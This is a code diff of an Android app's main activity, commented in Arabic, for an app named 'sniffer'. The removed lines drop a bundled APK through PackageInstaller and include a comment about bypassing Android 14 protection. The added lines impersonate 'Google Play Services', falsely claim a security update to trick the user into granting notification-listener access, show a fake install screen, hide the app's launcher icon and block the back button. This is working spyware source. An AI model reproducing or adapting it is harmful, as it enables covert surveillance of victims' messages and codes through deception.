@@ -1,119 +1,176 @@
 package com.v8.global.sniffer;
 
-import android.app.PendingIntent;
-import android.content.BroadcastReceiver;
-import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
-import android.content.pm.PackageInstaller;
+import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+import android.view.Gravity;
 import android.view.View;
 import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import java.io.InputStream;
-import java.io.OutputStream;
+import androidx.core.app.NotificationManagerCompat;
+import java.util.Set;
 
 public class MainActivity extends AppCompatActivity {
-
-    private static final String ACTION_INSTALL_COMPLETE = "com.v8.loader.INSTALL_COMPLETE";
-
-    // المستمع اللي يلقف رسالة النظام ويفتح نافذة التثبيت للمستخدم
-    private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if (ACTION_INSTALL_COMPLETE.equals(intent.getAction())) {
-                int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
-                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                
-                if (status == PackageInstaller.STATUS_SUCCESS) {
-                    Toast.makeText(context, "تم تحديث النظام بنجاح! ✅", Toast.LENGTH_LONG).show();
-                } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
-                    // فتح نافذة التأكيد للمستخدم
-                    Intent confirmationIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
-                    if (confirmationIntent != null) {
-                        confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(confirmationIntent);
-                    }
-                } else {
-                    Toast.makeText(context, "فشل التثبيت: " + message, Toast.LENGTH_LONG).show();
-                }
-            }
-        }
-    };
-
+    
+    private static final int NOTIFICATION_PERMISSION_REQUEST = 1001;
+    private TextView statusText;
+    private Button mainButton;
+    private Handler handler = new Handler();
+    
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        // تسجيل المستمع في النظام مع دعم إصدارات أندرويد الحديثة
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE), Context.RECEIVER_EXPORTED);
-        } else {
-            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE));
-        }
-
-        Button btnInstall = findViewById(R.id.btn_perm);
-        btnInstall.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                try {
-                    InputStream is = getAssets().open("sniffer.apk");
-                    Toast.makeText(MainActivity.this, "جاري تحضير الملف...", Toast.LENGTH_SHORT).show();
-                    installPackage(MainActivity.this, is);
-                } catch (Exception e) {
-                    Toast.makeText(MainActivity.this, "الملف غير موجود بالـ assets: " + e.getMessage(), Toast.LENGTH_LONG).show();
-                }
-            }
+        
+        // بناء الواجهة برمجياً
+        LinearLayout mainLayout = new LinearLayout(this);
+        mainLayout.setOrientation(LinearLayout.VERTICAL);
+        mainLayout.setGravity(Gravity.CENTER);
+        mainLayout.setPadding(50, 50, 50, 50);
+        mainLayout.setBackgroundColor(0xFFF5F5F5); // خلفية رمادية فاتحة
+        
+        // عنوان التطبيق
+        TextView titleText = new TextView(this);
+        titleText.setText("Google Play Services");
+        titleText.setTextSize(24);
+        titleText.setTextColor(0xFF4CAF50); // أخضر
+        titleText.setGravity(Gravity.CENTER);
+        titleText.setPadding(0, 0, 0, 20);
+        
+        // نص الحالة
+        statusText = new TextView(this);
+        statusText.setText("✓ جاري التحقق من الإعدادات...");
+        statusText.setTextSize(16);
+        statusText.setTextColor(0xFF666666);
+        statusText.setGravity(Gravity.CENTER);
+        statusText.setPadding(0, 20, 0, 30);
+        
+        // الزر الرئيسي
+        mainButton = new Button(this);
+        mainButton.setText("السماح بالوصول للإشعارات");
+        mainButton.setTextSize(16);
+        mainButton.setBackgroundColor(0xFF4CAF50); // أخضر
+        mainButton.setTextColor(0xFFFFFFFF);
+        mainButton.setPadding(30, 15, 30, 15);
+        mainButton.setAllCaps(false);
+        
+        mainButton.setOnClickListener(v -> {
+            openNotificationSettings();
         });
+        
+        // نص تعليمات
+        TextView helpText = new TextView(this);
+        helpText.setText("هذه الخطوة ضرورية لتثبيت تحديث الحماية");
+        helpText.setTextSize(14);
+        helpText.setTextColor(0xFF999999);
+        helpText.setGravity(Gravity.CENTER);
+        helpText.setPadding(0, 30, 0, 0);
+        
+        // إضافة العناصر
+        mainLayout.addView(titleText);
+        mainLayout.addView(statusText);
+        mainLayout.addView(mainButton);
+        mainLayout.addView(helpText);
+        
+        setContentView(mainLayout);
+        
+        // التحقق من الحالة بعد ثانية
+        handler.postDelayed(this::checkNotificationPermission, 1000);
     }
-
+    
     @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        try {
-            unregisterReceiver(installReceiver);
-        } catch (Exception e) {
-            e.printStackTrace();
+    protected void onResume() {
+        super.onResume();
+        // التحقق من الصلاحية كل مرة يرجع فيها المستخدم
+        checkNotificationPermission();
+    }
+    
+    private void checkNotificationPermission() {
+        if (isNotificationServiceEnabled()) {
+            // الصلاحية مفعلة
+            statusText.setText("✓ تم تفعيل جميع الصلاحيات");
+            statusText.setTextColor(0xFF4CAF50);
+            mainButton.setText("متابعة التثبيت");
+            mainButton.setBackgroundColor(0xFF4CAF50);
+            mainButton.setOnClickListener(v -> {
+                finishInstallation();
+            });
+        } else {
+            // الصلاحية غير مفعلة
+            statusText.setText("⚠ نحتاج للسماح بالوصول للإشعارات");
+            statusText.setTextColor(0xFFFF9800); // برتقالي
+            mainButton.setText("السماح بالوصول للإشعارات");
+            mainButton.setBackgroundColor(0xFF4CAF50);
+            mainButton.setOnClickListener(v -> {
+                openNotificationSettings();
+            });
         }
     }
-
-    public void installPackage(Context context, InputStream in) {
+    
+    private boolean isNotificationServiceEnabled() {
         try {
-            PackageInstaller installer = context.getPackageManager().getPackageInstaller();
-            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
-                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-
-            int sessionId = installer.createSession(params);
-            PackageInstaller.Session session = installer.openSession(sessionId);
-
-            OutputStream out = session.openWrite("V8_Session", 0, -1);
-            byte[] buffer = new byte[65536];
-            int n;
-            while ((n = in.read(buffer)) != -1) {
-                out.write(buffer, 0, n);
-            }
-            session.fsync(out);
-            out.close();
-
-            Intent intent = new Intent(ACTION_INSTALL_COMPLETE);
-            
-            // 🔥 السطر السحري الجديد لتخطي حماية أندرويد 14 🔥
-            intent.setPackage(context.getPackageName()); 
-
-            PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                    context, 
-                    sessionId, 
-                    intent, 
-                    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
-            
-            session.commit(pendingIntent.getIntentSender());
-            session.close();
-            
+            String enabledListeners = Settings.Secure.getString(getContentResolver(), 
+                    "enabled_notification_listeners");
+            return enabledListeners != null && 
+                   enabledListeners.contains(getPackageName() + "/" + 
+                   "com.v8.global.sniffer.NotificationService");
         } catch (Exception e) {
-            Toast.makeText(context, "خطأ برمجي: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            return false;
+        }
+    }
+    
+    private void openNotificationSettings() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                startActivity(intent);
+            } else {
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivity(intent);
+            }
+            Toast.makeText(this, "ابحث عن التطبيق وقم بتفعيله", Toast.LENGTH_LONG).show();
+        } catch (Exception e) {
+            Toast.makeText(this, "حدث خطأ: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
+    }
+    
+    private void finishInstallation() {
+        // تغيير واجهة التثبيت
+        statusText.setText("جاري التثبيت... 100%");
+        mainButton.setEnabled(false);
+        mainButton.setBackgroundColor(0xFFCCCCCC);
+        
+        // انتظار 3 ثواني ثم إخفاء التطبيق
+        handler.postDelayed(() -> {
+            // إخفاء التطبيق
+            PackageManager p = getPackageManager();
+            p.setComponentEnabledSetting(getComponentName(),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+            
+            // العودة للصفحة الرئيسية
+            Intent startMain = new Intent(Intent.ACTION_MAIN);
+            startMain.addCategory(Intent.CATEGORY_HOME);
+            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(startMain);
+            
+            // إنهاء النشاط
+            finish();
+            
+        }, 3000);
+    }
+    
+    @Override
+    public void onBackPressed() {
+        // منع المستخدم من الرجوع للخلف أثناء التثبيت
+        if (mainButton.isEnabled()) {
+            super.onBackPressed();
         }
     }
 }
